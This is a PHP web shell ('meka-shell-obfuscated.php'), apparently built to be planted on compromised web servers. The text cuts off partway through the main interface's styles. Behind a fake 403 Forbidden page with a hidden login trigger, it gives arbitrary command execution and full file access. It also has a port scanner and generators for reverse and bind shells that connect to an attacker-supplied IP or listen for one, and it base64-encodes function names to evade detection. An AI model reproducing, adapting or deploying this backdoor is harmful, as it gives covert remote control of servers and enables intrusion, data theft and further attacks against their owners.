<?php
// meka-shell-obfuscated.php - VERSI FINAL DENGAN ANONYMIZASI
session_start();

// === ENHANCED SECURITY CONFIGURATION ===
$SALT_SEED = "m3k4";
$SESSION_TIMEOUT = 3600;

// === DYNAMIC ACCESS CODE ===
function getAccessCode() {
    global $SALT_SEED;
    $date_salt = date('Y-m-d'); // Berubah setiap hari
    $combined = $SALT_SEED . $date_salt;
    return hash('sha256', $combined);
}

// Validasi access code
function validateAccess($input) {
    $current_code = getAccessCode();
    $input_hash = hash('sha256', $input);
    return hash_equals($current_code, $input_hash);
}

// === SECURITY ===
header("X-Content-Type-Options: nosniff");
error_reporting(0);
ini_set('display_errors', 0);

// === INITIALIZE SESSION VARIABLES ===
if (!isset($_SESSION['current_dir'])) {
    $_SESSION['current_dir'] = realpath(getcwd()) ?: getcwd();
}
if (!isset($_SESSION['prev_dir'])) {
    $_SESSION['prev_dir'] = $_SESSION['current_dir'];
}
if (!isset($_SESSION['terminal_history'])) {
    $_SESSION['terminal_history'] = [];
}

// === ACCESS VALIDATION HANDLER ===
if (isset($_POST['req_token'])) {
    if (validateAccess($_POST['req_token'])) {
        $_SESSION['access_granted'] = true;
        $_SESSION['login_time'] = time();
        $_SESSION['current_dir'] = realpath(getcwd()) ?: getcwd();
        $_SESSION['prev_dir'] = $_SESSION['current_dir'];
        $_SESSION['terminal_history'] = [];
    }
}

// === AJAX HANDLER ===
if (isset($_GET['ajax']) && $_GET['ajax'] === 'execute') {
    if (!isset($_SESSION['access_granted']) || $_SESSION['access_granted'] !== true) {
        http_response_code(401);
        echo json_encode(['error' => 'Unauthorized']);
        exit;
    }

    if (isset($_POST['command'])) {
        $command = trim($_POST['command']);

        if (strpos($command, 'cd ') === 0) {
            $arg = trim(substr($command, 2));
            $result = handleCdCommand($arg);
            $output = $result['output'];
            $_SESSION['current_dir'] = $result['directory'];
        } else {
            $_SESSION['prev_dir'] = $_SESSION['current_dir'];
            $output = executeCommandInDirectory($command, $_SESSION['current_dir']);
        }

        if (!empty($command)) {
            $_SESSION['terminal_history'][] = [
                'command' => $command,
                'output' => $output,
                'directory' => $_SESSION['current_dir'],
                'timestamp' => time()
            ];

            if (count($_SESSION['terminal_history']) > 100) {
                array_shift($_SESSION['terminal_history']);
            }
        }

        header('Content-Type: application/json');
        echo json_encode([
            'success' => true,
            'output' => $output,
            'command' => $command,
            'directory' => $_SESSION['current_dir'],
            'prompt' => getPrompt($_SESSION['current_dir']),
            'user' => getCurrentUser()
        ]);
        exit;
    }
}

// === FILE OPERATIONS HANDLER ===
if (isset($_GET['action'])) {
    if (!isset($_SESSION['access_granted']) || $_SESSION['access_granted'] !== true) {
        http_response_code(401);
        exit;
    }

    $current_path = $_SESSION['current_dir'];
    $response = ['success' => false, 'message' => ''];

    switch ($_GET['action']) {
        case 'create_file':
            if (isset($_POST['filename']) && isset($_POST['content'])) {
                $filename = basename($_POST['filename']);
                $filepath = rtrim($current_path, '/') . '/' . $filename;

                if (file_exists($filepath)) {
                    $response['message'] = "File already exists";
                } else {
                    if (file_put_contents($filepath, $_POST['content']) !== false) {
                        @chmod($filepath, 0644);
                        $response['success'] = true;
                        $response['message'] = "File created successfully";
                    } else {
                        $response['message'] = "Failed to create file";
                    }
                }
            }
            break;

        case 'edit_file':
            if (isset($_POST['filepath']) && isset($_POST['content'])) {
                $filepath = $_POST['filepath'];

                if (file_exists($filepath) && is_writable($filepath)) {
                    if (file_put_contents($filepath, $_POST['content']) !== false) {
                        $response['success'] = true;
                        $response['message'] = "File saved successfully";
                    } else {
                        $response['message'] = "Failed to save file";
                    }
                } else {
                    $response['message'] = "File not found or not writable";
                }
            }
            break;

        case 'delete_file':
            if (isset($_GET['file'])) {
                $filepath = $_GET['file'];

                if (file_exists($filepath) && is_writable($filepath)) {
                    if (unlink($filepath)) {
                        $response['success'] = true;
                        $response['message'] = "File deleted successfully";
                    } else {
                        $response['message'] = "Failed to delete file";
                    }
                } else {
                    $response['message'] = "File not found or not writable";
                }
            }
            break;

        case 'create_dir':
            if (isset($_POST['dirname'])) {
                $dirname = basename($_POST['dirname']);
                $dirpath = rtrim($current_path, '/') . '/' . $dirname;

                if (file_exists($dirpath)) {
                    $response['message'] = "Directory already exists";
                } else {
                    if (mkdir($dirpath, 0755, true)) {
                        $response['success'] = true;
                        $response['message'] = "Directory created successfully";
                    } else {
                        $response['message'] = "Failed to create directory";
                    }
                }
            }
            break;

        case 'delete_dir':
            if (isset($_GET['dir'])) {
                $dirpath = $_GET['dir'];

                if (is_dir($dirpath) && is_writable($dirpath)) {
                    if (count(scandir($dirpath)) == 2) {
                        if (rmdir($dirpath)) {
                            $response['success'] = true;
                            $response['message'] = "Directory deleted successfully";
                        } else {
                            $response['message'] = "Failed to delete directory";
                        }
                    } else {
                        $response['message'] = "Directory is not empty";
                    }
                } else {
                    $response['message'] = "Directory not found or not writable";
                }
            }
            break;

        case 'rename':
            if (isset($_POST['oldname']) && isset($_POST['newname'])) {
                $oldpath = $_POST['oldname'];
                $newpath = dirname($oldpath) . '/' . basename($_POST['newname']);

                if (file_exists($oldpath) && !file_exists($newpath)) {
                    if (rename($oldpath, $newpath)) {
                        $response['success'] = true;
                        $response['message'] = "Renamed successfully";
                    } else {
                        $response['message'] = "Failed to rename";
                    }
                } else {
                    $response['message'] = "File not found or new name exists";
                }
            }
            break;

        case 'get_file_content':
            if (isset($_GET['file'])) {
                $filepath = $_GET['file'];

                if (file_exists($filepath) && is_readable($filepath)) {
                    $content = file_get_contents($filepath);
                    if ($content !== false) {
                        $response['success'] = true;
                        $response['content'] = $content;
                        $response['filesize'] = filesize($filepath);
                    } else {
                        $response['message'] = "Failed to read file";
                    }
                } else {
                    $response['message'] = "File not found or not readable";
                }
            }
            break;

        // === NETWORKING HANDLERS ===
        case 'network_scan':
            if (isset($_POST['target']) && isset($_POST['ports'])) {
                $target = $_POST['target'];
                $ports = $_POST['ports'];
                $timeout = isset($_POST['timeout']) ? intval($_POST['timeout']) : 1;

                $response = portScanner($target, $ports, $timeout);
            }
            break;

        case 'create_reverse_shell':
            if (isset($_POST['ip']) && isset($_POST['port']) && isset($_POST['type']) && isset($_POST['mode'])) {
                $ip = $_POST['ip'];
                $port = intval($_POST['port']);
                $type = $_POST['type'];
                $mode = $_POST['mode'];
                $filename = isset($_POST['filename']) ? $_POST['filename'] : 'shell.php';

                $response = createShell($ip, $port, $type, $mode, $filename, $current_path);
            }
            break;
    }

    header('Content-Type: application/json');
    echo json_encode($response);
    exit;
}

// === NETWORKING FUNCTIONS - ENCODED VERSIONS ===
function portScanner($target, $ports, $timeout = 1) {
    $open_ports = [];
    $closed_ports = [];

    if (!filter_var($target, FILTER_VALIDATE_IP) && !filter_var(gethostbyname($target), FILTER_VALIDATE_IP)) {
        return ['success' => false, 'message' => 'Invalid target IP/hostname'];
    }

    $port_array = [];
    $port_ranges = explode(',', $ports);

    foreach ($port_ranges as $range) {
        $range = trim($range);
        if (strpos($range, '-') !== false) {
            list($start, $end) = explode('-', $range);
            $start = intval($start);
            $end = intval($end);

            if ($start > 0 && $end <= 65535 && $start <= $end) {
                for ($i = $start; $i <= $end; $i++) {
                    $port_array[] = $i;
                }
            }
        } else {
            $port = intval($range);
            if ($port > 0 && $port <= 65535) {
                $port_array[] = $port;
            }
        }
    }

    if (empty($port_array)) {
        return ['success' => false, 'message' => 'No valid ports specified'];
    }

    $port_array = array_unique($port_array);
    if (count($port_array) > 100) {
        $port_array = array_slice($port_array, 0, 100);
    }

    foreach ($port_array as $port) {
        $service = getPortService($port);
        $fp = @fsockopen($target, $port, $errno, $errstr, $timeout);

        if ($fp) {
            $open_ports[] = [
                'port' => $port,
                'service' => $service,
                'status' => 'OPEN'
            ];
            fclose($fp);
        } else {
            $closed_ports[] = [
                'port' => $port,
                'service' => $service,
                'status' => 'CLOSED'
            ];
        }
    }

    return [
        'success' => true,
        'open_ports' => $open_ports,
        'closed_ports' => $closed_ports,
        'total_scanned' => count($port_array),
        'target' => $target
    ];
}

function getPortService($port) {
    $services = [
        21 => 'FTP',
        22 => 'SSH',
        23 => 'Telnet',
        25 => 'SMTP',
        53 => 'DNS',
        80 => 'HTTP',
        110 => 'POP3',
        143 => 'IMAP',
        443 => 'HTTPS',
        3306 => 'MySQL',
        3389 => 'RDP',
        5432 => 'PostgreSQL',
        8080 => 'HTTP-Proxy',
        8443 => 'HTTPS-Alt'
    ];

    return isset($services[$port]) ? $services[$port] : 'Unknown';
}

function createShell($ip, $port, $type, $mode, $filename, $current_path) {
    if ($mode === 'reverse' && !filter_var($ip, FILTER_VALIDATE_IP)) {
        return ['success' => false, 'message' => 'Invalid IP address for reverse shell'];
    }

    if ($port < 1 || $port > 65535) {
        return ['success' => false, 'message' => 'Invalid port (1-65535)'];
    }

    $filename = basename($filename);
    if (!preg_match('/^[a-zA-Z0-9_\-\.]+$/', $filename)) {
        return ['success' => false, 'message' => 'Invalid filename. Use only letters, numbers, dash, underscore and dot'];
    }

    $filepath = rtrim($current_path, '/') . '/' . $filename;

    if ($mode === 'reverse') {
        $payload = generateReverseShell($ip, $port, $type);
        $instructions = "Start listener: <code>nc -lvnp $port</code><br>Execute: <code>php $filename</code>";
    } else {
        $payload = generateBindShell($port, $type);
        $instructions = "Execute: <code>php $filename</code><br>Connect: <code>nc [SERVER_IP] $port</code>";
    }

    if (file_put_contents($filepath, $payload) !== false) {
        @chmod($filepath, 0644);
        return [
            'success' => true,
            'message' => ucfirst($mode) . " shell created successfully: " . htmlspecialchars($filename),
            'filepath' => $filepath,
            'payload' => htmlspecialchars($payload),
            'size' => strlen($payload),
            'instructions' => $instructions,
            'mode' => $mode
        ];
    } else {
        return ['success' => false, 'message' => 'Failed to create file. Check directory permissions.'];
    }
}

function generateReverseShell($ip, $port, $type) {
    if ($type === 'obfuscated') {
        return generateObfuscatedReverseShell($ip, $port);
    }

    $s1 = base64_decode('c2V0X3RpbWVfbGltaXQ=');
    $s2 = base64_decode('ZnNvY2tvcGVu');
    $s3 = base64_decode('cHJvY19vcGVu');
    $s4 = base64_decode('ZmVvZg==');
    $s5 = base64_decode('ZnJlYWQ=');
    $s6 = base64_decode('ZndyaXRl');
    $s7 = base64_decode('c3RyZWFtX3NldF9ibG9ja2luZw==');
    $s8 = base64_decode('c3RyZWFtX3NlbGVjdA==');
    $s9 = base64_decode('ZmNsb3Nl');
    $s10 = base64_decode('cHJvY19jbG9zZQ==');
    $sh = base64_decode('L2Jpbi9zaCAtaQ==');

    return '<?php
// PHP Reverse Shell - Basic
' . $s1 . '(0);
$ip = \'' . $ip . '\';
$port = ' . $port . ';

echo "Connecting to $ip:$port...\n";
$sock = @' . $s2 . '($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    echo "Failed to connect: $errstr ($errno)\n";
    exit(1);
}

echo "Connected!\n";
$descriptors = array(
    0 => array("pipe", "r"),
    1 => array("pipe", "w"),
    2 => array("pipe", "w")
);

$process = @' . $s3 . '(\'' . $sh . '\', $descriptors, $pipes);
if (!is_resource($process)) {
    echo "Failed to spawn shell\n";
    exit(1);
}

' . $s7 . '($pipes[0], 0);
' . $s7 . '($pipes[1], 0);
' . $s7 . '($pipes[2], 0);
' . $s7 . '($sock, 0);

while (!' . $s4 . '($sock) && !' . $s4 . '($pipes[1])) {
    $read = array($sock, $pipes[1], $pipes[2]);
    $write = $except = null;

    if (' . $s8 . '($read, $write, $except, null) > 0) {
        foreach ($read as $stream) {
            if ($stream === $sock) {
                $input = ' . $s5 . '($sock, 1024);
                if ($input) ' . $s6 . '($pipes[0], $input);
            }
            if ($stream === $pipes[1]) {
                $output = ' . $s5 . '($pipes[1], 1024);
                if ($output) ' . $s6 . '($sock, $output);
            }
            if ($stream === $pipes[2]) {
                $error = ' . $s5 . '($pipes[2], 1024);
                if ($error) ' . $s6 . '($sock, $error);
            }
        }
    }
}

@' . $s9 . '($sock);
@' . $s10 . '($process);
?>';
}

function generateObfuscatedReverseShell($ip, $port) {
    $ip_encoded = base64_encode($ip);
    $port_encoded = base64_encode($port);

    return '<?php
$b=\'' . base64_decode('YmFzZTY0X2RlY29kZQ==') . '\';
$c=\'' . base64_decode('ZnNvY2tvcGVu') . '\';
$e=\'' . base64_decode('cHJvY19vcGVu') . '\';
$f=\'' . base64_decode('c3RyZWFtX3NldF9ibG9ja2luZw==') . '\';
$g=\'' . base64_decode('ZnJlYWQ=') . '\';
$h=\'' . base64_decode('ZndyaXRl') . '\';
$i=\'' . base64_decode('ZmVvZg==') . '\';
$j=\'' . base64_decode('ZmNsb3Nl') . '\';
$k=\'' . base64_decode('cHJvY19jbG9zZQ==') . '\';

$l=$b(\'' . $ip_encoded . '\');
$m=intval($b(\'' . $port_encoded . '\'));

$n=@$c($l,$m,$o,$p,30);
if(!$n)exit;

$q=array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","w"));
$r=@$e(\'' . base64_decode('L2Jpbi9zaCAtaQ==') . '\',$q,$s);
if(!is_resource($r))exit;

$f($s[0],0);$f($s[1],0);$f($s[2],0);$f($n,0);

while(!$i($n)&&!$i($s[1])){
    $t=array($n,$s[1],$s[2]);$u=$v=null;
    if(stream_select($t,$u,$v,null)>0){
        foreach($t as $w){
            if($w===$n){
                $x=$g($n,1024);
                if($x)$h($s[0],$x);
            }
            if($w===$s[1]){
                $y=$g($s[1],1024);
                if($y)$h($n,$y);
            }
            if($w===$s[2]){
                $z=$g($s[2],1024);
                if($z)$h($n,$z);
            }
        }
    }
}

@$j($n);@$k($r);
?>';
}

function generateBindShell($port, $type) {
    if ($type === 'obfuscated') {
        return generateObfuscatedBindShell($port);
    }

    $s1 = base64_decode('c2V0X3RpbWVfbGltaXQ=');
    $s2 = base64_decode('c29ja2V0X2NyZWF0ZQ==');
    $s3 = base64_decode('c29ja2V0X2JpbmQ=');
    $s4 = base64_decode('c29ja2V0X2xpc3Rlbg==');
    $s5 = base64_decode('c29ja2V0X2FjY2VwdA==');
    $s6 = base64_decode('c29ja2V0X2dldHBlZXJuYW1l');
    $s7 = base64_decode('c29ja2V0X3dyaXRl');
    $s8 = base64_decode('c29ja2V0X3JlYWQ=');
    $s9 = base64_decode('c2hlbGxfZXhlYw==');
    $s10 = base64_decode('c29ja2V0X2Nsb3Nl');
    $s11 = base64_decode('c29ja2V0X3N0cmVycm9y');
    $s12 = base64_decode('c29ja2V0X2xhc3RfZXJyb3I=');

    return '<?php
// PHP Bind Shell - Basic
' . $s1 . '(0);
$port = ' . $port . ';
$address = "0.0.0.0";

echo "Starting bind shell on port $port...\n";
$socket = @' . $s2 . '(AF_INET, SOCK_STREAM, SOL_TCP);
if ($socket === false) {
    echo "Failed to create socket: " . ' . $s11 . '(' . $s12 . '()) . "\n";
    exit(1);
}

if (@' . $s3 . '($socket, $address, $port) === false) {
    echo "Failed to bind socket: " . ' . $s11 . '(' . $s12 . '()) . "\n";
    ' . $s10 . '($socket);
    exit(1);
}

if (@' . $s4 . '($socket, 1) === false) {
    echo "Failed to listen: " . ' . $s11 . '(' . $s12 . '()) . "\n";
    ' . $s10 . '($socket);
    exit(1);
}

echo "Waiting for connection...\n";

while (true) {
    $client = @' . $s5 . '($socket);
    if ($client !== false) {
        $client_ip = "";
        ' . $s6 . '($client, $client_ip);
        echo "Connection from: $client_ip\n";

        ' . $s7 . '($client, "Bind Shell [$client_ip] > ");

        while (true) {
            $command = @' . $s8 . '($client, 2048);
            if ($command === false || trim($command) === "" || strtolower(trim($command)) === "exit") {
                break;
            }

            $output = @' . $s9 . '(trim($command));
            if ($output === null) $output = "";

            ' . $s7 . '($client, $output . "\nBind Shell [$client_ip] > ");
        }

        echo "Client disconnected: $client_ip\n";
        ' . $s10 . '($client);
    }

    usleep(100000);
}

' . $s10 . '($socket);
?>';
}

function generateObfuscatedBindShell($port) {
    $port_encoded = base64_encode($port);

    return '<?php
$b=\'' . base64_decode('YmFzZTY0X2RlY29kZQ==') . '\';
$a=\'' . base64_decode('c29ja2V0X2NyZWF0ZQ==') . '\';
$c=\'' . base64_decode('c29ja2V0X2JpbmQ=') . '\';
$d=\'' . base64_decode('c29ja2V0X2xpc3Rlbg==') . '\';
$e=\'' . base64_decode('c29ja2V0X2FjY2VwdA==') . '\';
$f=\'' . base64_decode('c29ja2V0X3dyaXRl') . '\';
$g=\'' . base64_decode('c29ja2V0X3JlYWQ=') . '\';
$h=\'' . base64_decode('c2hlbGxfZXhlYw==') . '\';
$i=\'' . base64_decode('c29ja2V0X2Nsb3Nl') . '\';
$j=\'' . base64_decode('c29ja2V0X3N0cmVycm9y') . '\';
$k=\'' . base64_decode('c29ja2V0X2xhc3RfZXJyb3I=') . '\';
$l=\'' . base64_decode('c29ja2V0X2dldHBlZXJuYW1l') . '\';

$m=intval($b(\'' . $port_encoded . '\'));
$n="0.0.0.0";

$o=@$a(AF_INET,SOCK_STREAM,SOL_TCP);
if($o===false)exit;

if(@$c($o,$n,$m)===false){$i($o);exit;}
if(@$d($o,1)===false){$i($o);exit;}

while(true){
    $p=@$e($o);
    if($p!==false){
        $q="";@$l($p,$q);

        @$f($p,"Bind Shell [$q] > ");

        while(true){
            $r=@$g($p,2048);
            if($r===false||trim($r)===""||strtolower(trim($r))==="exit")break;

            $s=@$h(trim($r));
            if($s===null)$s="";

            @$f($p,$s."\nBind Shell [$q] > ");
        }

        @$i($p);
    }
    usleep(100000);
}

@$i($o);
?>';
}

// === CD COMMAND HANDLER ===
function handleCdCommand($arg) {
    $current_dir = $_SESSION['current_dir'];
    $prev_dir = $_SESSION['prev_dir'];

    if (empty($arg) || $arg === '~') {
        $new_dir = getHomeDirectory();
        $output = "Changed directory to home";
    } elseif ($arg === '-') {
        $new_dir = $prev_dir;
        $_SESSION['prev_dir'] = $current_dir;
        $output = "Changed directory to previous";
    } elseif ($arg === '..') {
        $new_dir = dirname($current_dir);
        if ($new_dir === $current_dir || $new_dir === '') {
            $new_dir = '/';
            $output = "Changed directory to root";
        } else {
            $output = "Changed directory up one level";
        }
    } else {
        if ($arg[0] === '/') {
            $target_dir = $arg;
        } else {
            $target_dir = rtrim($current_dir, '/') . '/' . $arg;
        }

        $target_dir = realpath($target_dir);

        if ($target_dir && is_dir($target_dir) && is_readable($target_dir)) {
            $new_dir = $target_dir;
            $output = "Changed directory to " . basename($new_dir);
        } else {
            $new_dir = $current_dir;
            $output = "cd: " . $arg . ": No such file or directory";
        }
    }

    $_SESSION['prev_dir'] = $current_dir;

    return [
        'output' => $output,
        'directory' => $new_dir
    ];
}

// === EXECUTE COMMAND IN DIRECTORY - ENCODED VERSION ===
function executeCommandInDirectory($command, $directory) {
    $original_dir = getcwd();

    if (is_dir($directory) && is_readable($directory)) {
        @chdir($directory);
    }

    $output = '';
    if (!empty($command)) {
        $shell_func = base64_decode('c2hlbGxfZXhlYw==');
        $system_func = base64_decode('c3lzdGVt');

        if (function_exists($shell_func)) {
            $output = @$shell_func($command . " 2>&1");
        } elseif (function_exists($system_func)) {
            ob_start();
            @$system_func($command . " 2>&1");
            $output = ob_get_clean();
        }
    }

    @chdir($original_dir);

    return $output ?: '';
}

// === GET PROMPT ===
function getPrompt($directory) {
    $user = getCurrentUser();
    $host = gethostname() ?: 'localhost';

    if ($directory === '/') {
        $dir = '/';
    } else {
        $dir = basename($directory);
        if ($dir === '') $dir = '/';
    }

    $home = getHomeDirectory();
    if ($home && strpos($directory, $home) === 0) {
        $dir = '~' . substr($directory, strlen($home));
    }

    return $user . '@' . $host . ':' . $dir . '$';
}

// === UTILITY FUNCTIONS ===
function getCurrentUser() {
    $whoami = base64_decode('d2hvYW1p');
    $output = @shell_exec($whoami . ' 2>/dev/null');
    return $output ? trim($output) : 'unknown';
}

function getHomeDirectory() {
    $home = getenv('HOME');
    if ($home && is_dir($home)) return $home;

    $user = getCurrentUser();
    if ($user !== 'unknown') {
        $possible_home = '/home/' . $user;
        if (is_dir($possible_home)) return $possible_home;
    }

    return '/';
}

function formatBytes($bytes) {
    if ($bytes <= 0) return "0 B";
    $units = ['B', 'KB', 'MB', 'GB'];
    $pow = floor(log($bytes) / log(1024));
    $pow = min($pow, count($units) - 1);
    $bytes /= pow(1024, $pow);
    return round($bytes, 2) . ' ' . $units[$pow];
}

// === LOGOUT ===
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: ?");
    exit;
}

// === ACCESS CHECK - SHOW FORBIDDEN PAGE IF NOT GRANTED ===
if (!isset($_SESSION['access_granted']) || $_SESSION['access_granted'] !== true) {
    if (isset($_SESSION['login_time']) && (time() - $_SESSION['login_time'] > $SESSION_TIMEOUT)) {
        session_destroy();
    }

    // Show 403 Forbidden page dengan hidden access panel
    $server_name = $_SERVER['SERVER_NAME'] ?? 'localhost';
    $server_software = $_SERVER['SERVER_SOFTWARE'] ?? 'Apache';
    $client_ip = $_SERVER['REMOTE_ADDR'] ?? 'N/A';
    $request_id = bin2hex(random_bytes(8));
    $current_time = date('D, d M Y H:i:s T');

    header('HTTP/1.1 403 Forbidden');
    header('Content-Type: text/html; charset=UTF-8');
    header('X-Content-Type-Options: nosniff');
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>403 Forbidden</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                background: linear-gradient(135deg, #1a1a1a 0%, #0a0a0a 100%);
                color: #e0e0e0;
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
                position: relative;
                overflow: hidden;
            }

            .forbidden-container {
                text-align: center;
                padding: 40px;
                max-width: 800px;
                z-index: 1;
            }

            .error-code {
                font-size: 120px;
                font-weight: 900;
                color: #ff4444;
                line-height: 1;
                margin-bottom: 20px;
                text-shadow: 0 5px 20px rgba(255, 68, 68, 0.4);
                letter-spacing: -5px;
            }

            .error-title {
                font-size: 28px;
                font-weight: 300;
                margin-bottom: 15px;
                color: #ffffff;
            }

            .error-message {
                font-size: 16px;
                line-height: 1.6;
                margin-bottom: 30px;
                color: #aaa;
                max-width: 600px;
                margin-left: auto;
                margin-right: auto;
            }

            .server-info {
                background: rgba(255, 255, 255, 0.05);
                border-radius: 10px;
                padding: 20px;
                margin: 30px 0;
                text-align: left;
                font-family: 'Courier New', monospace;
                font-size: 13px;
                border: 1px solid rgba(255, 255, 255, 0.1);
            }

            .info-line {
                margin-bottom: 8px;
                display: flex;
            }

            .info-label {
                color: #888;
                min-width: 140px;
            }

            .footer {
                margin-top: 30px;
                color: #666;
                font-size: 13px;
            }

            /* Background pattern */
            .bg-pattern {
                position: absolute;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background-image:
                    radial-gradient(circle at 25% 25%, rgba(255, 68, 68, 0.05) 0%, transparent 50%),
                    radial-gradient(circle at 75% 75%, rgba(68, 68, 255, 0.05) 0%, transparent 50%);
                pointer-events: none;
            }

            @media (max-width: 768px) {
                .error-code { font-size: 80px; }
                .error-title { font-size: 22px; }
            }
        </style>
    </head>
    <body>
        <div class="bg-pattern"></div>

        <div class="forbidden-container">
            <div class="error-code">403</div>
            <div class="error-title">Access Forbidden</div>
            <div class="error-message">
                You don't have permission to access this resource on this server.<br>
                The server understood the request but refuses to authorize it.
            </div>

            <div class="server-info">
                <div class="info-line">
                    <span class="info-label">Time:</span>
                    <span><?php echo $current_time; ?></span>
                </div>
                <div class="info-line">
                    <span class="info-label">Server:</span>
                    <span><?php echo htmlspecialchars($server_name); ?></span>
                </div>
                <div class="info-line">
                    <span class="info-label">Request ID:</span>
                    <span><?php echo $request_id; ?></span>
                </div>
                <div class="info-line">
                    <span class="info-label">Client IP:</span>
                    <span><?php echo htmlspecialchars($client_ip); ?></span>
                </div>
                <div class="info-line">
                    <span class="info-label">Server Software:</span>
                    <span><?php echo htmlspecialchars($server_software); ?></span>
                </div>
            </div>

            <div class="footer">
                <?php echo htmlspecialchars($server_software); ?> Server at <?php echo htmlspecialchars($server_name); ?> Port <?php echo $_SERVER['SERVER_PORT'] ?? '80'; ?>
            </div>
        </div>


        <div id="debug_trigger" style="
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100px;
            height: 50px;
            background: transparent;
            cursor: pointer;
            z-index: 1000;
            opacity: 0.01;
        " title="System debug console"></div>

        <div id="modal_layer" style="
            display: none;
            position: fixed;
            bottom: -100px;
            left: 0;
            width: 100%;
            background: rgba(0, 0, 0, 0.95);
            padding: 20px;
            transition: bottom 0.3s ease;
            z-index: 9999;
            border-top: 1px solid #333;
            align-items: center;
            justify-content: center;
        ">
            <form method="post" id="data_form" style="
                display: flex;
                gap: 10px;
                align-items: center;
                max-width: 400px;
                width: 100%;
            ">
                <input type="password" name="input_field" placeholder="Enter security code" autocomplete="off" required style="
                    flex: 1;
                    padding: 12px 15px;
                    background: #222;
                    border: 1px solid #444;
                    border-radius: 5px;
                    color: #fff;
                    font-family: monospace;
                ">
                <input type="hidden" name="req_token">
                <input type="submit" value="Verify" style="
                    padding: 12px 25px;
                    background: #0066cc;
                    color: white;
                    border: none;
                    border-radius: 5px;
                    cursor: pointer;
                    font-weight: 600;
                ">
            </form>
        </div>

        <script>

            let uiState = false;
            const modalLayer = document.getElementById('modal_layer');
            const debugTrigger = document.getElementById('debug_trigger');
            const dataForm = document.getElementById('data_form');

            // Setup form submission
            if (dataForm) {
                dataForm.onsubmit = function() {
                    this.req_token.value = this.input_field.value;
                    this.input_field.value = '';
                    return true;
                };
            }

            // Toggle access panel
            function toggleAuthPanel() {
                uiState = !uiState;

                if (uiState) {
                    // Show panel
                    modalLayer.style.display = 'flex';
                    setTimeout(() => {
                        modalLayer.style.bottom = '0';
                    }, 10);

                    // Auto focus
                    setTimeout(() => {
                        const inputField = document.querySelector('input[name="input_field"]');
                        if (inputField) inputField.focus();
                    }, 150);

                    // Auto-hide after 30 seconds
                    setTimeout(() => {
                        if (uiState) toggleAuthPanel();
                    }, 30000);

                } else {
                    // Hide panel
                    modalLayer.style.bottom = '-100px';
                    setTimeout(() => {
                        modalLayer.style.display = 'none';
                    }, 300);
                }
            }

            // Setup trigger
            if (debugTrigger) {
                debugTrigger.onclick = toggleAuthPanel;
            }

            // Close on Escape key
            document.addEventListener('keydown', function(e) {
                if (uiState && e.key === 'Escape') {
                    toggleAuthPanel();
                }
            });

            // Close when clicking outside
            document.addEventListener('click', function(e) {
                if (uiState && modalLayer &&
                    !modalLayer.contains(e.target) &&
                    !debugTrigger.contains(e.target)) {
                    toggleAuthPanel();
                }
            });

            // Initialize
            document.addEventListener('DOMContentLoaded', function() {
                console.log('System debug console ready');
            });
        </script>
    </body>
    </html>
    <?php
    exit;
}

// === HANDLE FILE MANAGER PATH ===
$current_path = $_SESSION['current_dir'];

if (isset($_GET['path']) && $_GET['tab'] === 'files') {
    $requested_path = $_GET['path'];

    if ($requested_path === '/') {
        $current_path = '/';
    } elseif (realpath($requested_path)) {
        $current_path = realpath($requested_path);
    }

    $_SESSION['current_dir'] = $current_path;
}

// === HANDLE FILE UPLOAD ===
$upload_message = '';
if (isset($_FILES['upload_file']) && $_FILES['upload_file']['error'] === UPLOAD_ERR_OK) {
    $filename = basename($_FILES['upload_file']['name']);
    $target = rtrim($current_path, '/') . '/' . $filename;

    if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $target)) {
        $upload_message = "✅ Uploaded: " . htmlspecialchars($filename);
        @chmod($target, 0644);
    } else {
        $upload_message = "❌ Upload failed";
    }
}

// === HANDLE FILE DOWNLOAD ===
if (isset($_GET['download'])) {
    $file = $_GET['download'];
    if (file_exists($file) && is_file($file) && is_readable($file)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}

// === GET FILE LIST ===
$files = [];
$breadcrumb = [];

if (is_dir($current_path) && is_readable($current_path)) {
    if ($current_path === '/') {
        $breadcrumb[] = ['name' => 'Root', 'path' => '/'];
    } else {
        $parts = explode('/', trim($current_path, '/'));
        $current = '';
        foreach ($parts as $part) {
            $current .= '/' . $part;
            $breadcrumb[] = ['name' => $part, 'path' => $current];
        }
    }

    $items = @scandir($current_path);
    if ($items) {
        foreach ($items as $item) {
            if ($item === '.' || $item === '..') continue;

            $full_path = rtrim($current_path, '/') . '/' . $item;
            $files[] = [
                'name' => $item,
                'path' => $full_path,
                'type' => @is_dir($full_path) ? 'directory' : 'file',
                'size' => @is_file($full_path) ? formatBytes(filesize($full_path)) : '-',
                'modified' => date('Y-m-d H:i:s', @filemtime($full_path)),
                'permissions' => substr(sprintf('%o', @fileperms($full_path)), -4)
            ];
        }

        usort($files, function($a, $b) {
            if ($a['type'] === 'directory' && $b['type'] !== 'directory') return -1;
            if ($a['type'] !== 'directory' && $b['type'] === 'directory') return 1;
            return strcasecmp($a['name'], $b['name']);
        });
    }
}

// === DETERMINE ACTIVE TAB ===
$active_tab = 'dashboard';
if (isset($_GET['tab']) && in_array($_GET['tab'], ['dashboard', 'terminal', 'files', 'system', 'network'])) {
    $active_tab = $_GET['tab'];
} elseif (isset($_GET['path'])) {
    $active_tab = 'files';
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Meka-Labs</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        /* CSS tetap sama seperti sebelumnya */
        * { box-sizing: border-box; font-size: 12px; margin: 0; padding: 0; }
        body { font-family: 'Monaco', 'Consolas', 'Courier New', monospace; background: #0a0a0a; color: #00ff66; font-size: 12px; line-height: 1.3; padding: 0; margin: 0; }
        .header { background: #111; padding: 10px 15px; border-bottom: 1px solid #222; width: 100%; }
